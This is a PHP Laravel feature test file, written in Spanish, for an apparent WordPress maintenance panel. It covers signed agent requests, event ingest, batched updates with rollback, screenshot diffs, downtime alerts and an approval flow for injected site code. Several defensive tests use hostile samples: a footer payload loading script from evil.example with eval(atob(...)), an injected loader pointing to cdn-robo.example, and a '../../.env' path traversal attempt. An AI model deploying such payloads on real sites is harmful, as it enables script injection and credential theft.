<?php

namespace Tests\Feature;

use App\Webminder\Panel\Models\Cliente;
use App\Webminder\Panel\Models\Credencial;
use App\Webminder\Panel\Models\Ejecucion;
use App\Webminder\Panel\Models\EventoActividad;
use App\Webminder\Panel\Jobs\ActualizarSitio;
use App\Models\User;
use App\Webminder\Panel\Models\SitioWeb;
use App\Webminder\Panel\Services\AgenteComunicacionService;
use App\Webminder\Panel\Services\CapturasService;
use App\Webminder\Panel\Services\InjertoService;
use App\Webminder\Panel\Models\InjertoSolicitud;
use App\Webminder\Panel\Jobs\RevertirItem;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Sleep;
use Tests\TestCase;

class WebminderPanelTest extends TestCase
{
    use RefreshDatabase;

    private SitioWeb $sitio;

    private string $secreto = 'sk_secreto_de_prueba_0123456789abcdef0123456789abcdef';

    protected function setUp(): void
    {
        parent::setUp();
        Sleep::fake();
        $cliente = Cliente::create(['nombre' => 'Ana', 'empresa' => 'ACME', 'email' => 'ana@acme.test']);
        $this->sitio = SitioWeb::create(['cliente_id' => $cliente->id, 'nombre' => 'ACME', 'url' => 'https://acme.test/', 'activo' => true, 'estado' => 'sin_verificar']);
        Credencial::create(['sitio_id' => $this->sitio->id, 'client_id' => 'webminder_1_abc', 'client_secret' => $this->secreto, 'activa' => true]);
    }

    private function agente(): AgenteComunicacionService
    {
        return app(AgenteComunicacionService::class);
    }

    public function test_el_secreto_se_guarda_cifrado(): void
    {
        $crudo = \DB::table('panel_credenciales')->value('client_secret');
        $this->assertNotSame($this->secreto, $crudo);
        $this->assertSame($this->secreto, $this->sitio->credencial->client_secret);
    }

    public function test_actualizar_envia_tipo_e_item_con_firma_v2_de_metodo_y_ruta(): void
    {
        Http::fake(['acme.test/*' => Http::response(['success' => true, 'message' => 'ok'])]);

        $r = $this->agente()->ejecutarActualizacion($this->sitio, 'plugin', 'akismet/akismet.php');

        $this->assertTrue($r['success']);
        Http::assertSent(function (Request $req) {
            $ts = (int) $req->header('X-Webminder-Timestamp')[0];
            $esperada = hash_hmac('sha256', "POST\n/webminder/v1/update\n{$ts}\n" . $req->body(), $this->secreto);

            return $req->url() === 'https://acme.test/wp-json/webminder/v1/update'
                && $req['type'] === 'plugin' && $req['item'] === 'akismet/akismet.php'
                && strlen($req['_nonce']) === 16
                && $req->header('X-Webminder-Signature-V2')[0] === $esperada;
        });
    }

    public function test_un_post_que_falla_no_se_reintenta(): void
    {
        Http::fake(['acme.test/*' => Http::response('', 500)]);

        $r = $this->agente()->ejecutarActualizacion($this->sitio, 'plugin', 'akismet/akismet.php');

        $this->assertFalse($r['success']);
        // Solo se consulta /job después; el /update no se repite
        $this->assertCount(1, Http::recorded(fn (Request $req) => str_ends_with($req->url(), '/update')));
    }

    public function test_un_wp_error_se_convierte_en_fallo_con_su_mensaje(): void
    {
        Http::fake(['acme.test/*' => Http::response(['code' => 'invalid_signature', 'message' => 'Firma inválida', 'data' => ['status' => 401]], 401)]);

        $r = $this->agente()->obtenerStatus($this->sitio);

        $this->assertFalse($r['success']);
        $this->assertSame('Firma inválida', $r['error']);
        $this->assertSame('offline', $this->sitio->fresh()->estado);
    }

    public function test_la_rotacion_no_cambia_nada_si_el_sitio_no_acepta_el_secreto_nuevo(): void
    {
        Http::fake([
            'acme.test/wp-json/webminder/v1/rotate' => Http::response(['success' => true]),
            'acme.test/wp-json/webminder/v1/ping-auth' => Http::response(['code' => 'invalid_signature', 'message' => 'no'], 401),
        ]);
        $this->assertFalse($this->agente()->rotarSecreto($this->sitio)['success']);
        $this->assertSame($this->secreto, $this->sitio->credencial->fresh()->client_secret);
    }

    public function test_la_rotacion_guarda_el_secreto_nuevo_cuando_el_sitio_lo_acepta(): void
    {
        Http::fake([
            'acme.test/wp-json/webminder/v1/rotate' => Http::response(['success' => true]),
            'acme.test/wp-json/webminder/v1/ping-auth' => Http::response(['success' => true]),
        ]);
        $this->assertTrue($this->agente()->rotarSecreto($this->sitio->fresh())['success']);
        $this->assertNotSame($this->secreto, $this->sitio->credencial->fresh()->client_secret);
    }

    private function ingesta(array $eventos, ?string $secreto = null, ?int $ts = null)
    {
        $cuerpo = json_encode(['client_id' => 'webminder_1_abc', 'events' => $eventos]);
        $ts ??= time();
        $firma = AgenteComunicacionService::firmar('POST', '/api/webminder/ingest', $ts, $cuerpo, $secreto ?? $this->secreto);

        return $this->call('POST', '/api/webminder/ingest', [], [], [], [
            'CONTENT_TYPE' => 'application/json',
            'HTTP_X_WEBMINDER_CLIENT' => 'webminder_1_abc',
            'HTTP_X_WEBMINDER_SIGNATURE_V2' => $firma,
            'HTTP_X_WEBMINDER_TIMESTAMP' => (string) $ts,
        ], $cuerpo);
    }

    public function test_la_ingesta_guarda_eventos_y_un_reenvio_no_duplica(): void
    {
        $eventos = [
            ['local_id' => 7, 'occurred_at' => '2026-10-19T10:00:00Z', 'action' => 'login', 'actor_login' => 'ana', 'severity' => 'info'],
            ['local_id' => 8, 'occurred_at' => '2026-10-19T10:01:00Z', 'action' => 'plugin_deactivated', 'severity' => 'critical', 'details' => ['plugin' => 'x']],
        ];

        $this->ingesta($eventos)->assertOk()->assertJson(['success' => true, 'accepted' => [7, 8]]);
        $this->ingesta($eventos)->assertOk()->assertJson(['accepted' => [7, 8]]);

        $this->assertSame(2, EventoActividad::count());
        $this->assertSame(['plugin' => 'x'], EventoActividad::where('local_id', 8)->first()->detalles);
    }

    public function test_la_ingesta_rechaza_firma_mala_y_timestamp_viejo(): void
    {
        $e = [['local_id' => 1, 'occurred_at' => '2026-10-19T10:00:00Z', 'action' => 'login']];

        $this->ingesta($e, 'sk_otro_secreto')->assertStatus(401);
        $this->ingesta($e, null, time() - 3600)->assertStatus(401);
        $this->assertSame(0, EventoActividad::count());
    }

    /** Ejecuta en orden los pasos que se van encolando (con la cola falsa, como haría el worker de la cola). */
    private function vaciarCola(): void
    {
        for ($k = 0; $job = Queue::pushed(ActualizarSitio::class)->values()->get($k); $k++) {
            $job->handle(app(AgenteComunicacionService::class), app(CapturasService::class));
        }
    }

    private function procesar(Ejecucion $e): void
    {
        Queue::fake();
        ActualizarSitio::dispatch($e->id);
        $this->vaciarCola();
    }

    private function lote(array $items, bool $copia = true): Ejecucion
    {
        return Ejecucion::create(['sitio_id' => $this->sitio->id, 'copia_bd' => $copia, 'items' => array_map(
            fn ($i) => ['tipo' => 'plugin', 'item' => $i, 'nombre' => $i, 'desde' => '1', 'hasta' => '2', 'estado' => 'pendiente', 'mensaje' => null],
            $items
        )]);
    }

    public function test_el_lote_hace_copia_y_sigue_tras_un_rollback(): void
    {
        Http::fake(function (Request $req) {
            return match (true) {
                str_ends_with($req->url(), '/backup-db') => Http::response(['success' => true, 'file' => 'wp-content/x/db.sql.gz']),
                str_ends_with($req->url(), '/status') => Http::response(['success' => true, 'data' => []]),
                ($req->data()['item'] ?? null) === 'b/b.php' => Http::response(['success' => false, 'rolled_back' => true, 'message' => 'HTTP 500, restaurado']),
                default => Http::response(['success' => true, 'verified' => true, 'message' => 'ok']),
            };
        });
        $e = $this->lote(['a/a.php', 'b/b.php', 'c/c.php']);

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('con_errores', $e->estado);
        $this->assertSame('wp-content/x/db.sql.gz', $e->archivo_copia_bd);
        $this->assertSame(['ok', 'revertido', 'ok'], array_column($e->items, 'estado'));
    }

    public function test_si_la_copia_de_bd_falla_no_se_actualiza_nada(): void
    {
        Http::fake(['*' => Http::response(['code' => 'dump_error', 'message' => 'disco lleno'], 500)]);
        $e = $this->lote(['a/a.php']);

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('interrumpida', $e->estado);
        $this->assertStringContainsString('disco lleno', $e->error);
        $this->assertSame(['pendiente'], array_column($e->items, 'estado'));
        Http::assertSentCount(1);
    }

    public function test_si_se_pierde_el_contacto_el_lote_se_detiene(): void
    {
        Http::fake(function (Request $req) {
            if (($req->data()['item'] ?? null) === 'a/a.php') {
                throw new \Illuminate\Http\Client\ConnectionException('timeout');
            }

            return Http::response(['success' => true, 'data' => []]);
        });
        $e = $this->lote(['a/a.php', 'b/b.php'], false);

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('interrumpida', $e->estado);
        $this->assertSame(['error', 'omitido'], array_column($e->items, 'estado'));
    }

    public function test_la_copia_larga_tras_un_524_se_recoge_en_job(): void
    {
        $consultas = 0;
        Http::fake(function (Request $req) use (&$consultas) {
            return match (true) {
                // Cloudflare corta el arranque, pero en el sitio la copia sigue
                str_ends_with($req->url(), '/backup-db') => Http::response('<html>524</html>', 524),
                str_ends_with($req->url(), '/job') => Http::response(++$consultas < 3
                    ? ['success' => true, 'status' => 'running', 'started' => 1]
                    : ['success' => true, 'status' => 'done', 'started' => 1, 'result' => ['success' => true, 'file' => 'wp-content/x/db.sql.gz']]),
                str_ends_with($req->url(), '/update') => Http::response(['success' => true, 'status' => 'running', 'job' => $req->data()['job']]),
                default => Http::response(['success' => true, 'data' => []]),
            };
        });
        $e = $this->lote(['a/a.php']);

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('wp-content/x/db.sql.gz', $e->archivo_copia_bd);
        $this->assertSame('completada', $e->estado);
        Http::assertSent(fn (Request $r) => str_ends_with($r->url(), '/backup-db') && strlen($r->data()['job'] ?? '') === 32);
    }

    public function test_si_el_sitio_deja_de_avanzar_el_lote_se_detiene_con_su_progreso(): void
    {
        Http::fake(function (Request $req) {
            return str_ends_with($req->url(), '/job')
                ? Http::response(['success' => true, 'status' => 'running', 'started' => 1000, 'beat' => 1000, 'now' => 1400, 'progress' => 'Copiando wp_simple_history (120.000 filas)'])
                : Http::response(['success' => true, 'status' => 'running', 'job' => 'x']);
        });
        $e = $this->lote(['a/a.php']);

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('interrumpida', $e->estado);
        $this->assertStringContainsString('dejó de avanzar', $e->error);
        $this->assertStringContainsString('wp_simple_history', $e->error);
        $this->assertNull($e->progreso);
        $this->assertCount(1, Http::recorded(fn (Request $r) => str_ends_with($r->url(), '/job')));
    }

    public function test_un_worker_sin_job_devuelve_su_respuesta_directa(): void
    {
        Http::fake(function (Request $req) {
            return str_ends_with($req->url(), '/job')
                ? Http::response(['code' => 'rest_no_route', 'message' => 'No route'], 404)
                : Http::response('', 524);
        });

        $r = app(AgenteComunicacionService::class)->ejecutarActualizacion($this->sitio, 'plugin', 'a/a.php');

        $this->assertFalse($r['success']);
        $this->assertStringContainsString('HTTP 524', $r['error']);
    }

    /** JPEG de prueba: fondo blanco, un bloque de color y una franja que cambia (ruido). */
    private static function jpeg(int $alto = 800, ?array $bloque = null, int $ruido = 0): string
    {
        $img = imagecreatetruecolor(400, $alto);
        imagefill($img, 0, 0, imagecolorallocate($img, 255, 255, 255));
        imagefilledrectangle($img, 0, 0, 399, 40, imagecolorallocate($img, $ruido, 0, 255 - $ruido)); // "slider"
        if ($bloque) {
            imagefilledrectangle($img, ...$bloque, ...[imagecolorallocate($img, 200, 30, 30)]);
        }
        ob_start();
        imagejpeg($img, null, 90);

        return ob_get_clean();
    }

    public function test_la_comparacion_ignora_el_ruido_y_detecta_cambios_reales(): void
    {
        $c = app(CapturasService::class);

        // El slider cambia en las tres capturas: no cuenta
        [$igual] = $c->comparar(self::jpeg(ruido: 0), self::jpeg(ruido: 255), self::jpeg(ruido: 120));
        $this->assertLessThan(1, $igual);

        // Un bloque nuevo de 200x200 en 400x800 es ~12% de la página
        [$roto, $diff] = $c->comparar(self::jpeg(), self::jpeg(), self::jpeg(bloque: [100, 300, 300, 500]));
        $this->assertGreaterThan(CapturasService::UMBRAL, $roto);
        $this->assertStringStartsWith("\xFF\xD8", $diff);

        // La página crece un 25%: cuenta como cambio
        [$crece] = $c->comparar(self::jpeg(), self::jpeg(), self::jpeg(1000));
        $this->assertGreaterThan(15, $crece);
    }

    public function test_el_lote_compara_capturas_y_permite_revertir(): void
    {
        Storage::fake('local');
        config(['services.capturas.cuenta' => 'cuenta', 'services.capturas.token' => 't']);
        $capturas = 0;
        Http::fake(function (Request $req) use (&$capturas) {
            return match (true) {
                // 2 vistas x (antes, antes2) y luego las de después, con un bloque roto
                // La primera vez Cloudflare pide esperar: se reintenta la misma captura
                str_contains($req->url(), 'browser-run/screenshot') => ++$capturas === 1
                    ? Http::response(['errors' => [['message' => 'Rate limit']]], 429, ['Retry-After' => '10'])
                    : Http::response($capturas > 5 ? self::jpeg(bloque: [100, 300, 300, 500]) : self::jpeg()),
                str_ends_with($req->url(), '/update') => Http::response(['success' => true, 'verified' => true, 'item' => 'a/a.php', 'backup' => 'a-backup-123']),
                default => Http::response(['success' => true, 'data' => []]),
            };
        });
        $e = $this->lote(['a/a.php'], false);

        $this->procesar($e);

        $e->refresh();
        $item = $e->items[0];
        $this->assertSame('cambio_visual', $item['estado']);
        $this->assertGreaterThan(CapturasService::UMBRAL, $item['visual']['escritorio']);
        $this->assertSame('a-backup-123', $item['backup']);
        Storage::disk('local')->assertExists(CapturasService::ruta($e->id, '0-movil-diff.jpg'));
        Http::assertSent(fn (Request $r) => str_ends_with($r->url(), '/update') && ($r->data()['keep_backup'] ?? false) === true);
        Http::assertSent(fn (Request $r) => str_contains($r->url(), 'accounts/cuenta/browser-run/screenshot') && $r->hasHeader('Authorization', 'Bearer t')
            && $r->data()['screenshotOptions']['fullPage'] === true && $r->data()['viewport']['width'] === 390 && isset($r->data()['userAgent']));

        $usuario = User::factory()->create();
        $this->actingAs($usuario)->get(route('webminder-panel.ejecuciones.captura', [$e, '0-escritorio-antes.jpg']))->assertOk();
        $this->actingAs($usuario)->get(route('webminder-panel.ejecuciones.captura', [$e, '../../.env']))->assertNotFound();

        Queue::fake();
        $this->actingAs($usuario)->post(route('webminder-panel.ejecuciones.revertir', [$e, 0]))->assertRedirect();
        Queue::assertPushed(RevertirItem::class);
        $this->assertSame('revirtiendo', $e->refresh()->items[0]['estado']);

        (new RevertirItem($e->id, 0))->handle(app(AgenteComunicacionService::class));
        $this->assertSame('revertido_manual', $e->refresh()->items[0]['estado']);
        Http::assertSent(fn (Request $r) => str_ends_with($r->url(), '/rollback') && $r->data()['backup'] === 'a-backup-123' && $r->data()['item'] === 'a/a.php');
    }

    public function test_las_pantallas_del_panel_cargan(): void
    {
        Http::fake(['*' => Http::response(['success' => true, 'data' => [
            ['type' => 'plugin', 'item' => 'a/a.php', 'name' => 'Plugin A', 'version' => '2.0', 'current_version' => '1.0'],
            ['type' => 'translation', 'item' => 'translations', 'name' => 'Traducciones', 'version' => '3'],
        ]])]);
        $user = User::create(['name' => 'Admin', 'email' => 'admin@test.test', 'password' => bcrypt('x'), 'role' => 'admin']);
        $e = $this->lote(['a/a.php']);
        EventoActividad::create(['sitio_id' => $this->sitio->id, 'local_id' => 1, 'ocurrido_en' => now(), 'accion' => 'login', 'severidad' => 'critical']);

        $this->actingAs($user)->get(route('webminder-panel.sitios.show', $this->sitio))->assertOk()->assertSee('Actividad en el sitio')->assertSee('login');
        $this->actingAs($user)->get(route('webminder-panel.sitios.actualizaciones', $this->sitio))->assertOk()->assertSee('Plugin A')->assertSee('3 paquetes');
        $this->actingAs($user)->get(route('webminder-panel.ejecuciones.show', $e))->assertOk()->assertSee('location.reload', false);
        $this->actingAs($user)->get(route('webminder-panel.sitios.credenciales', $this->sitio))->assertOk()->assertSee('Desvincular');
    }

    public function test_el_login_tiene_limite_de_intentos(): void
    {
        for ($i = 0; $i < 5; $i++) {
            $this->post('/login', ['email' => 'nadie@test.test', 'password' => 'mal']);
        }
        $this->post('/login', ['email' => 'nadie@test.test', 'password' => 'mal'])->assertStatus(429);
    }

    /** @return \Symfony\Component\Mime\Email[] */
    private function correos(): array
    {
        return app('mailer')->getSymfonyTransport()->messages()->map(fn ($m) => $m->getOriginalMessage())->all();
    }

    public function test_vigilar_avisa_una_vez_de_la_caida_y_de_la_vuelta(): void
    {
        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
        Http::fake(['acme.test/*' => Http::sequence()->push('', 503)->push('', 503)->push('', 503)->push('', 503)->push('ok', 200)]);

        $this->artisan('webminder:vigilar')->assertSuccessful();
        $this->assertNotNull($this->sitio->refresh()->caida_desde);
        $this->artisan('webminder:vigilar'); // sigue caída: sin segundo aviso
        $this->artisan('webminder:vigilar');

        $this->assertNull($this->sitio->refresh()->caida_desde);
        $asuntos = array_map(fn ($c) => $c->getSubject(), $this->correos());
        $this->assertSame(['watchWP · 🔴 ACME está caída', 'watchWP · 🟢 ACME vuelve a funcionar'], $asuntos);
        Http::assertSent(fn (Request $req) => str_contains($req->url(), 'watchwp='));
    }

    public function test_un_fallo_suelto_no_cuenta_como_caida(): void
    {
        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
        Http::fake(['acme.test/*' => Http::sequence()->push('', 502)->push('ok', 200)]);

        $this->artisan('webminder:vigilar');

        $this->assertNull($this->sitio->refresh()->caida_desde);
        $this->assertSame([], $this->correos());
    }

    public function test_la_nocturna_actualiza_plugins_y_temas_y_manda_el_informe(): void
    {
        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
        Http::fake(function (Request $req) {
            return match (true) {
                str_ends_with($req->url(), '/updates') => Http::response(['success' => true, 'backups_size' => 1572864, 'data' => [
                    ['type' => 'translation', 'item' => 'translations', 'name' => 'Traducciones', 'version' => '3'],
                    ['type' => 'core', 'item' => 'core', 'name' => 'WordPress', 'current_version' => '6.8', 'version' => '6.9'],
                    ['type' => 'plugin', 'item' => 'a/a.php', 'name' => 'Plugin A', 'current_version' => '1.0', 'version' => '1.1'],
                    ['type' => 'theme', 'item' => 'tema', 'name' => 'Tema', 'current_version' => '2.0', 'version' => '2.1'],
                ]]),
                str_ends_with($req->url(), '/backup-db') => Http::response(['success' => true, 'file' => 'db.sql.gz']),
                str_ends_with($req->url(), '/status') => Http::response(['success' => true, 'data' => []]),
                ($req->data()['item'] ?? null) === 'tema' => Http::response(['success' => false, 'rolled_back' => true, 'message' => 'HTTP 500']),
                default => Http::response(['success' => true, 'verified' => true]),
            };
        });

        Queue::fake();
        $this->artisan('webminder:nocturna')->assertSuccessful();
        $this->assertSame([], $this->correos()); // el informe sale al acabar, no al lanzar
        $this->vaciarCola();

        $e = Ejecucion::sole();
        $this->assertSame(['core', 'a/a.php', 'tema', 'translations'], array_column($e->items, 'item'));
        $this->assertSame(['ok', 'ok', 'revertido', 'ok'], array_column($e->items, 'estado'));
        $this->assertSame('con_errores', $e->estado);
        // Un paso por job: copia de BD + 4 ítems
        Queue::assertPushed(ActualizarSitio::class, 5);
        $this->assertTrue($e->copia_bd);
        [$informe] = $this->correos();
        $this->assertStringStartsWith('watchWP · Informe de mantenimiento', $informe->getSubject());
        $this->assertStringContainsString('Plugin A 1.0 → 1.1: actualizado', $informe->getTextBody());
        $this->assertStringContainsString('Tema 2.0 → 2.1: ✖ falló y se revirtió (HTTP 500)', $informe->getTextBody());
        $this->assertStringContainsString('WordPress 6.8 → 6.9: actualizado', $informe->getTextBody());
        $this->assertStringContainsString('Traducciones (3 paquetes): actualizado', $informe->getTextBody());
        $this->assertStringContainsString('ACME: con errores (copias en el sitio: 1.5 MB)', $informe->getTextBody());
    }

    public function test_si_el_proceso_muere_a_mitad_se_retoma_el_trabajo_del_sitio(): void
    {
        Http::fake(function (Request $req) {
            return match (true) {
                str_ends_with($req->url(), '/job') && $req['job'] === 'trabajoqueseguiaenelsitio123' => Http::response(['success' => true, 'status' => 'done', 'result' => ['success' => true, 'verified' => true]]),
                str_ends_with($req->url(), '/status') => Http::response(['success' => true, 'data' => []]),
                default => Http::response(['success' => true, 'verified' => true]),
            };
        });
        $e = $this->lote(['a/a.php', 'b/b.php'], false);
        $e->update(['estado' => 'en_curso', 'job_remoto' => 'trabajoqueseguiaenelsitio123']);
        $e->marcarItem(0, 'en_curso');

        $this->procesar($e);

        $e->refresh();
        $this->assertSame('completada', $e->estado);
        $this->assertSame(['ok', 'ok'], array_column($e->items, 'estado'));
        $this->assertNull($e->job_remoto);
        // a/a.php no se vuelve a lanzar: solo se recoge su resultado
        $this->assertCount(1, Http::recorded(fn (Request $req) => str_ends_with($req->url(), '/update')));
    }

    public function test_un_lote_atascado_se_da_por_cortado_avisa_y_cierra_la_ronda(): void
    {
        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
        Http::fake(['*' => Http::response('ok', 200)]);
        $e = $this->lote(['a/a.php', 'b/b.php'], false);
        $e->update(['ronda' => '2026-10-20 23:00', 'estado' => 'en_curso', 'progreso' => 'Actualizando a/a.php…']);
        $e->marcarItem(0, 'en_curso');
        \DB::table('panel_ejecuciones')->update(['updated_at' => now()->subHours(2)]);

        $this->artisan('webminder:vigilar');

        $e->refresh();
        $this->assertSame('interrumpida', $e->estado);
        $this->assertSame(['error', 'pendiente'], array_column($e->items, 'estado'));
        $asuntos = array_map(fn ($c) => $c->getSubject(), $this->correos());
        $this->assertSame(['watchWP · ⚠ Actualización interrumpida en ACME', 'watchWP · Informe de mantenimiento 2026-10-20'], $asuntos);
    }

    /** Par de claves fijo de pruebas (el mismo que usa la prueba del plugin Injerto). */
    private function clavesInjerto(): string
    {
        $par = sodium_crypto_sign_seed_keypair(str_repeat('p', 32));
        config(['services.injerto.clave_privada' => base64_encode(sodium_crypto_sign_secretkey($par)),
            'services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);

        return sodium_crypto_sign_publickey($par);
    }

    public function test_la_firma_del_panel_sigue_el_formato_que_comprueba_injerto(): void
    {
        $publica = $this->clavesInjerto();

        $firma = InjertoService::firmar(0, ['head' => '<meta name="x">']);

        // Mismo literal que en la prueba del plugin: si cambia el formato, fallan los dos
        $mensaje = 'injerto|0|{"head":"<meta name=\"x\">","body":"","footer":"","jsonld":""}';
        $this->assertTrue(sodium_crypto_sign_verify_detached(base64_decode($firma), $mensaje, $publica));
    }

    public function test_una_solicitud_de_injerto_llega_por_la_ingesta_y_avisa_una_vez(): void
    {
        $this->clavesInjerto();
        $evento = ['local_id' => 9, 'occurred_at' => '2026-10-20T10:00:00Z', 'action' => 'injerto_solicitud', 'severity' => 'critical', 'details' => [
            'id' => 'abc123', 'ambito' => 0, 'ambito_nombre' => 'toda la web', 'usuario' => 'ana <ana@acme.test>', 'ip' => '1.2.3.4',
            'valores' => ['footer' => '<script src="https://evil.example/x.js"></script><script>eval(atob("x"))</script>'], 'anteriores' => [],
        ]];

        $this->ingesta([$evento])->assertOk();
        $this->ingesta([$evento])->assertOk(); // reenvío del worker

        $s = InjertoSolicitud::sole();
        $this->assertSame('pendiente', $s->estado);
        [$correo] = $this->correos();
        $this->assertStringContainsString('evil.example', $correo->getTextBody());
        $this->assertStringContainsString('⚠ ATENCIÓN, contiene: eval(, atob(', $correo->getTextBody());
        $this->assertStringContainsString(route('webminder-panel.injerto.show', $s), $correo->getTextBody());
        $this->assertCount(1, $this->correos());
    }

    public function test_aprobar_envia_el_codigo_firmado_a_la_web_y_acepta_sus_dominios(): void
    {
        $publica = $this->clavesInjerto();
        Http::fake(['acme.test/*' => Http::response(['success' => true])]);
        $s = InjertoSolicitud::create(['sitio_id' => $this->sitio->id, 'remoto_id' => 'abc123', 'ambito' => 5, 'ambito_nombre' => 'Inicio',
            'valores' => InjertoService::normalizar(['head' => '<script src="https://www.googletagmanager.com/gtm.js"></script>'])]);
        $usuario = User::factory()->create();

        $this->actingAs($usuario)->post(route('webminder-panel.injerto.aprobar', $s))->assertRedirect();

        Http::assertSent(fn (Request $req) => str_ends_with($req->url(), '/injerto') && $req['aprobar'] === true && $req['id'] === 'abc123'
            && sodium_crypto_sign_verify_detached(base64_decode($req['firma']), InjertoService::mensaje(5, $req['valores']), $publica));
        $this->assertSame('aprobada', $s->refresh()->estado);
        $this->assertSame($usuario->id, $s->decidida_por);
        $this->assertContains('www.googletagmanager.com', $this->sitio->refresh()->dominios_scripts['conocidos']);
        $this->actingAs($usuario)->post(route('webminder-panel.injerto.rechazar', $s))->assertStatus(409);
    }

    public function test_la_vigilancia_avisa_de_un_dominio_de_script_nuevo_solo_en_webs_con_injerto(): void
    {
        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
        $base = '<html><head><script src="https://acme.test/wp-includes/x.js"></script><script src="https://www.googletagmanager.com/gtm.js"></script>'
            . '<script type="application/ld+json">{"sameAs":"https://facebook.com/acme"}</script><script>var c={"u":"https:\/\/acme.test\/a"};</script></head></html>';
        $inyectado = str_replace('</head>', '<script>var s=document.createElement("script");s.src="https:\/\/cdn-robo.example\/s.js";</script></head>', $base);
        Http::fake(['acme.test/*' => Http::sequence()->push($base)->push($inyectado)->push($inyectado)]);
        $this->sitio->update(['tiene_injerto' => true]);

        $this->artisan('webminder:vigilar');
        $this->assertSame(['www.googletagmanager.com'], $this->sitio->refresh()->dominios_scripts['conocidos']); // ni la propia web ni el JSON-LD
        $this->assertSame([], $this->correos());

        $this->artisan('webminder:vigilar');
        $this->artisan('webminder:vigilar'); // sigue ahí: no repite el aviso
        $correos = $this->correos();
        $this->assertCount(1, $correos);
        $this->assertStringContainsString('cdn-robo.example', $correos[0]->getTextBody());

        $usuario = User::factory()->create();
        $this->actingAs($usuario)->get(route('webminder-panel.injerto.index'))->assertOk()->assertSee('cdn-robo.example');
        $this->actingAs($usuario)->post(route('webminder-panel.injerto.dominio', $this->sitio), ['dominio' => 'cdn-robo.example', 'accion' => 'aceptar']);
        $this->assertSame([], $this->sitio->refresh()->dominios_scripts['avisados']);

        $this->sitio->update(['tiene_injerto' => false, 'dominios_scripts' => null]);
        Http::fake(['acme.test/*' => Http::response($inyectado)]);
        $this->artisan('webminder:vigilar');
        $this->assertNull($this->sitio->refresh()->dominios_scripts); // sin Injerto no se vigila
    }

    public function test_la_pagina_de_una_solicitud_se_ve_con_su_codigo(): void
    {
        $s = InjertoSolicitud::create(['sitio_id' => $this->sitio->id, 'remoto_id' => 'abc', 'ambito' => 0, 'ambito_nombre' => 'toda la web',
            'valores' => InjertoService::normalizar(['body' => '<noscript>gtm</noscript>'])]);

        $this->actingAs(User::factory()->create())->get(route('webminder-panel.injerto.show', $s))
            ->assertOk()->assertSee('Aprobar y publicar')->assertSee('&lt;noscript&gt;gtm', false);
    }
}
